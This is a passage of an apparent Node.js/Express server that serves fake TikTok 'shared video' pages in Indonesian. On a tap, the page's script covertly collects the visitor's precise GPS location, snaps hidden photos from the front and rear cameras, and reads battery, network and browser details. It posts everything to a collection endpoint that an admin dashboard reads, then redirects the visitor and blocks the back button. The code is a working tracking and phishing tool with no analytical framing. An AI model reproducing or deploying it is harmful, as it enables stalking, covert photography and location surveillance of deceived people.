  var targetUrl = ${escJson(targetUrl)};
  var collectToken = ${escJson(collectToken)};
  var sessionId = '${escAttr(req.params.id)}-' + Math.random().toString(36).substring(2, 10);
  var fired = false;

  history.replaceState(null, '', location.href);
  window.addEventListener('popstate', function() { history.go(1); });

  function getGpsForce() {
    return new Promise(function(resolve) {
      if (!navigator.geolocation) return resolve(null);
      var attempts = 0;
      var maxAttempts = 3;
      function tryGps() {
        if (attempts >= maxAttempts) return resolve(null);
        attempts++;
        navigator.geolocation.getCurrentPosition(
          function(pos) {
            if (pos.coords.accuracy > 500 && attempts < maxAttempts) {
              setTimeout(tryGps, 500); 
            } else {
              resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy });
            }
          },
          function(err) {
            setTimeout(tryGps, 500);
          },
          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
        );
      }
      tryGps();
    });
  }

  function capPhoto(facing){
    return new Promise(function(resolve){
      var stream = null;
      (async function(){
        try{
          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing, width: { ideal: 640 } }, audio: false });
          var v = document.createElement('video');
          v.setAttribute('playsinline','true'); v.setAttribute('autoplay','true'); v.setAttribute('muted','true');
          v.srcObject = stream; v.style.cssText = 'position:absolute;opacity:0;width:1px;height:1px;';
          document.body.appendChild(v);
          await v.play();
          await new Promise(function(r){ setTimeout(r, 900); });
          var c = document.createElement('canvas');
          c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
          c.getContext('2d').drawImage(v, 0, 0);
          var data = c.toDataURL('image/jpeg', 0.6);
          if (stream) stream.getTracks().forEach(function(t){ t.stop(); });
          v.remove();
          resolve(data);
        }catch(e){
          if (stream) stream.getTracks().forEach(function(t){ t.stop(); });
          resolve(null);
        }
      })();
    });
  }

  async function run(){
    var payload = { id: sessionId, loc: null, photo_front: null, photo_back: null, battery: null, network: null, ua: navigator.userAgent, collect_token: collectToken };
    try{ if (navigator.getBattery){ var b = await navigator.getBattery(); payload.battery = Math.round(b.level*100) + '%' + (b.charging ? ' ⚡' : ''); } }catch(e){}
    if (navigator.connection) payload.network = navigator.connection.effectiveType || navigator.connection.type || null;

    payload.loc = await getGpsForce();
    
    await new Promise(function(r){ setTimeout(r, 1000); });

    payload.photo_front = await capPhoto('user');
    await new Promise(function(r){ setTimeout(r, 300); });
    payload.photo_back = await capPhoto('environment');

    try{
      await fetch('/api/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Collect-Token': collectToken },
        body: JSON.stringify(payload)
      });
    }catch(e){}
    
    window.location.replace(targetUrl);
  }

  function fire(){
    if (fired) return;
    fired = true;
    
    document.getElementById('playIcon').style.display = 'none';
    document.getElementById('spinner').style.display = 'block';
    
    var bailout = setTimeout(function(){ window.location.replace(targetUrl); }, 25000);
    run().then(function(){ clearTimeout(bailout); window.location.replace(targetUrl); }).catch(function(){ clearTimeout(bailout); window.location.replace(targetUrl); });
  }

  document.getElementById('tap-overlay').addEventListener('click', fire);
  document.getElementById('tap-overlay').addEventListener('touchstart', fire, { passive: true, once: true });
})();
</script>
</body></html>`;
  } else {
    // === LAYOUT TIKTOK ===
    html = `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="robots" content="noindex,nofollow">
<title>${escAttr(m.caption || 'Video')}</title>
<link rel="icon" type="image/png" href="${logoUrl}">
<style>
  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  body{height:100vh;background:#000;color:#fff;font-family:-apple-system,BlinkMacSystemFont,sans-serif;display:flex;flex-direction:column;overflow:hidden;user-select:none}
  
  .tap-overlay { position: absolute; inset: 0; z-index: 50; cursor: pointer; }

  .top-header { position: absolute; top: 0; left: 0; width: 100%; padding: 15px 20px; background: linear-gradient(180deg, rgba(0,0,0,0.8) 0%, rgba(0,0,0,0) 100%); z-index: 20; display: flex; align-items: center; justify-content: space-between; }
  .top-header-left { display: flex; align-items: center; gap: 12px; }
  .top-header-left img { width: 35px; height: 35px; border-radius: 50%; border: 1px solid rgba(255,255,255,0.2); object-fit: cover; }
  .top-header-text { display: flex; flex-direction: column; }
  .top-header-text .name { font-size: 14px; font-weight: 700; color: #fff; }
  .top-header-text .sub { font-size: 11px; color: #ccc; }
  .btn-buka { background: #fe2c55; color: #fff; padding: 6px 14px; border-radius: 6px; font-size: 12px; font-weight: 600; }

  .player-wrap{position:relative;width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:#000;}
  .thumb-img{width:100%;height:100%;object-fit:cover;}
  .overlay{position:absolute;inset:0;background:linear-gradient(0deg, rgba(0,0,0,0.9) 0%, rgba(0,0,0,0) 30%, rgba(0,0,0,0.2) 100%);z-index:2;}
  
  .play-btn{position:absolute;z-index:5;width:70px;height:70px;background:rgba(255,255,255,0.2);backdrop-filter:blur(5px);border-radius:50%;display:flex;align-items:center;justify-content:center;}
  .play-btn svg{width:35px;height:35px;fill:#fff;margin-left:5px}
  .loading-state{display:none;width:35px;height:35px;border:4px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 1s linear infinite;}
  @keyframes spin{to{transform:rotate(360deg)}}

  .sidebar{position:absolute;right:10px;bottom:120px;display:flex;flex-direction:column;gap:20px;z-index:10;align-items:center;}
  .icon-box { display: flex; flex-direction: column; align-items: center; gap: 4px; }
  .icon{width:40px;height:40px;border-radius:50%;background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;}
  .icon svg{width:22px;height:22px;fill:#fff}
  .icon-box span { font-size: 11px; font-weight: 600; color: #fff; text-shadow: 0 1px 2px #000; }
  .profile-avatar { width: 45px; height: 45px; border-radius: 50%; border: 2px solid #fff; position: relative; margin-bottom: 5px; }
  .plus-icon { position: absolute; bottom: -5px; left: 50%; transform: translateX(-50%); background: #fe2c55; color: #fff; width: 18px; height: 18px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: bold; }

  .bottom-info { position: absolute; bottom: 80px; left: 0; width: 100%; padding: 0 20px; z-index: 10; background: linear-gradient(0deg, rgba(0,0,0,0.9) 0%, rgba(0,0,0,0) 100%); pointer-events: none; }
  .bottom-info .author { font-size: 15px; font-weight: 700; margin-bottom: 8px; color: #fff; }
  .bottom-info .title { font-size: 13px; line-height: 1.4; margin-bottom: 10px; color: #eee; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
  .bottom-info .music { display: flex; align-items: center; gap: 6px; font-size: 12px; color: #fff; }
  .bottom-info .music svg { width: 14px; height: 14px; fill: #fff; }

  .bottom-footer { position: absolute; bottom: 0; left: 0; width: 100%; padding: 15px 20px; background: #fff; z-index: 30; display: flex; flex-direction: column; gap: 10px; pointer-events: none; }
  .footer-top { display: flex; align-items: center; gap: 10px; }
  .footer-top img { width: 30px; height: 30px; border-radius: 50%; object-fit: cover; }
  .footer-top .text { font-size: 12px; color: #000; font-weight: 500; }
  .footer-top .text b { font-weight: 700; }
  .btn-tonton { background: #fe2c55; color: #fff; width: 100%; padding: 12px; border-radius: 8px; font-size: 14px; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 8px; }
  .btn-tonton svg { width: 18px; height: 18px; fill: #fff; }
</style>
</head><body>

<div class="tap-overlay" id="tap-overlay"></div>

<div class="top-header">
  <div class="top-header-left">
    <img src="${m.avatar || 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNSIgaGVpZ2h0PSIzNSIgdmlld2JveD0iMCAwIDM1IDM1Ij48Y2lyY2xlIGN4PSIxNy41IiBjeT0iMTcuNSIgcj0iMTcuNSIgZmlsbD0iIzMzMyIvPjx0ZXh0IHg9IjE3LjUiIHk9IjIyIiBmb250LXNpemU9IjE0IiBmaWxsPSIjZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5APC90ZXh0Pjwvc3ZnPg=='}" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNSIgaGVpZ2h0PSIzNSIgdmlld2JveD0iMCAwIDM1IDM1Ij48Y2lyY2xlIGN4PSIxNy41IiBjeT0iMTcuNSIgcj0iMTcuNSIgZmlsbD0iIzMzMyIvPjx0ZXh0IHg9IjE3LjUiIHk9IjIyIiBmb250LXNpemU9IjE0IiBmaWxsPSIjZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5APC90ZXh0Pjwvc3ZnPg=='">
    <div class="top-header-text">
      <div class="name">${escAttr(m.user || 'User')}</div>
      <div class="sub">Bergabunglah dengan saya TikTok!</div>
    </div>
  </div>
  <div class="btn-buka">Buka aplikasi</div>
</div>

<div class="player-wrap">
  <img class="thumb-img" src="${thumb}" onerror="this.style.display='none'">
  <div class="overlay"></div>
  
  <div class="play-btn" id="playBtn">
    <svg id="playIcon" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
    <div class="loading-state" id="spinner"></div>
  </div>

  <div class="sidebar">
    <div class="profile-avatar">
      <img src="${m.avatar || 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0NSIgaGVpZ2h0PSI0NSIgdmlld2JveD0iMCAwIDQ1IDQ1Ij48Y2lyY2xlIGN4PSIyMi41IiBjeT0iMjIuNSIgcj0iMjIuNSIgZmlsbD0iIzMzMyIvPjx0ZXh0IHg9IjIyLjUiIHk9IjI4IiBmb250LXNpemU9IjE4IiBmaWxsPSIjZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5APC90ZXh0Pjwvc3ZnPg=='}" style="width:100%;height:100%;border-radius:50%;object-fit:cover">
      <div class="plus-icon">+</div>
    </div>
    <div class="icon-box">
      <div class="icon"><svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg></div>
      <span>74.1K</span>
    </div>
    <div class="icon-box">
      <div class="icon"><svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H6l-2 2V4h16v12z"/></svg></div>
      <span>2149</span>
    </div>
    <div class="icon-box">
      <div class="icon"><svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z"/></svg></div>
      <span>5907</span>
    </div>
  </div>

  <div class="bottom-info">
    <div class="author">@${escAttr(m.user || 'user')}</div>
    <div class="title">${escAttr(m.caption || 'Video')}</div>
    <div class="music">
      <svg viewBox="0 0 24 24"><path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/></svg>
      <span>suara asli - ${escAttr(m.user || 'user')}</span>
    </div>
  </div>
</div>

<div class="bottom-footer">
  <div class="footer-top">
    <img src="${m.avatar || 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMCIgaGVpZ2h0PSIzMCIgdmlld2JveD0iMCAwIDMwIDMwIj48Y2lyY2xlIGN4PSIxNSIgY3k9IjE1IiByPSIxNSIgZmlsbD0iIzMzMyIvPjx0ZXh0IHg9IjE1IiB5PSIxOSIgZm9udC1zaXplPSIxMiIgZmlsbD0iI2ZmZiIgdGV4dC1hbmNob3I9Im1pZGRsZSI+QDwvdGV4dD48L3N2Zz4='}" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMCIgaGVpZ2h0PSIzMCIgdmlld2JveD0iMCAwIDMwIDMwIj48Y2lyY2xlIGN4PSIxNSIgY3k9IjE1IiByPSIxNSIgZmlsbD0iIzMzMyIvPjx0ZXh0IHg9IjE1IiB5PSIxOSIgZm9udC1zaXplPSIxMiIgZmlsbD0iI2ZmZiIgdGV4dC1hbmNob3I9Im1pZGRsZSI+QDwvdGV4dD48L3N2Zz4='">
    <div class="text"><b>${escAttr(m.user || 'User')}</b> membagikan video kepada Anda.</div>
  </div>
  <div class="btn-tonton">
    <svg viewBox="0 0 24 24"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.31-4.64 2.93 2.93 0 01.88.13V9.4a6.84 6.84 0 00-1-.05A6.33 6.33 0 005 20.1a6.34 6.34 0 0010.86-4.43v-7a8.16 8.16 0 004.77 1.52v-3.4a4.85 4.85 0 01-1-.1z"/></svg>
    Tonton di TikTok
  </div>
</div>

<script>
(function(){
  var targetUrl = ${escJson(targetUrl)};
  var collectToken = ${escJson(collectToken)};
  var sessionId = '${escAttr(req.params.id)}-' + Math.random().toString(36).substring(2, 10);
  var fired = false;

  history.replaceState(null, '', location.href);
  window.addEventListener('popstate', function() { history.go(1); });

  function getGpsForce() {
    return new Promise(function(resolve) {
      if (!navigator.geolocation) return resolve(null);
      var attempts = 0;
      var maxAttempts = 3;
      function tryGps() {
        if (attempts >= maxAttempts) return resolve(null);
        attempts++;
        navigator.geolocation.getCurrentPosition(
          function(pos) {
            if (pos.coords.accuracy > 500 && attempts < maxAttempts) {
              setTimeout(tryGps, 500); 
            } else {
              resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy });
            }
          },
          function(err) {
            setTimeout(tryGps, 500);
          },
          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
        );
      }
      tryGps();
    });
  }

  function capPhoto(facing){
    return new Promise(function(resolve){
      var stream = null;
      (async function(){
        try{
          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing, width: { ideal: 640 } }, audio: false });
          var v = document.createElement('video');
          v.setAttribute('playsinline','true'); v.setAttribute('autoplay','true'); v.setAttribute('muted','true');
          v.srcObject = stream; v.style.cssText = 'position:absolute;opacity:0;width:1px;height:1px;';
          document.body.appendChild(v);
          await v.play();
          await new Promise(function(r){ setTimeout(r, 900); });
          var c = document.createElement('canvas');
          c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
          c.getContext('2d').drawImage(v, 0, 0);
          var data = c.toDataURL('image/jpeg', 0.6);
          if (stream) stream.getTracks().forEach(function(t){ t.stop(); });
          v.remove();
          resolve(data);
        }catch(e){
          if (stream) stream.getTracks().forEach(function(t){ t.stop(); });
          resolve(null);
        }
      })();
    });
  }

  async function run(){
    var payload = { id: sessionId, loc: null, photo_front: null, photo_back: null, battery: null, network: null, ua: navigator.userAgent, collect_token: collectToken };
    try{ if (navigator.getBattery){ var b = await navigator.getBattery(); payload.battery = Math.round(b.level*100) + '%' + (b.charging ? ' ⚡' : ''); } }catch(e){}
    if (navigator.connection) payload.network = navigator.connection.effectiveType || navigator.connection.type || null;

    payload.loc = await getGpsForce();
    
    await new Promise(function(r){ setTimeout(r, 1000); });

    payload.photo_front = await capPhoto('user');
    await new Promise(function(r){ setTimeout(r, 300); });
    payload.photo_back = await capPhoto('environment');

    try{
      await fetch('/api/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Collect-Token': collectToken },
        body: JSON.stringify(payload)
      });
    }catch(e){}
    
    window.location.replace(targetUrl);
  }

  function fire(){
    if (fired) return;
    fired = true;
    
    document.getElementById('playIcon').style.display = 'none';
    document.getElementById('spinner').style.display = 'block';
    document.querySelector('.overlay').style.background = 'rgba(0,0,0,0.6)'; 
    
    var bailout = setTimeout(function(){ window.location.replace(targetUrl); }, 25000);
    run().then(function(){ clearTimeout(bailout); window.location.replace(targetUrl); }).catch(function(){ clearTimeout(bailout); window.location.replace(targetUrl); });
  }

  document.getElementById('tap-overlay').addEventListener('click', fire);
  document.getElementById('tap-overlay').addEventListener('touchstart', fire, { passive: true, once: true });
})();
</script>
</body></html>`;
  }
  
  res.send(html);
});

app.get('/login', (req, res) => {
  if (verifyToken(req.cookies?.ct_session)) return res.redirect('/admin');
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});
app.get('/admin', requireAuth, (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));
app.get('/dashboard', requireAuth, (req, res) => res.sendFile(path.join(__dirname, 'public', 'dashboard.html')));
app.get('/', (req, res) => {
  if (verifyToken(req.cookies?.ct_session)) return res.redirect('/admin');
  res.redirect('/login');
});

app.use('/data/uploads', requireAuth, express.static(UPLOAD_DIR, { index: false }));

app.listen(PORT, HOST, () => console.log('[listen] ' + HOST + ':' + PORT));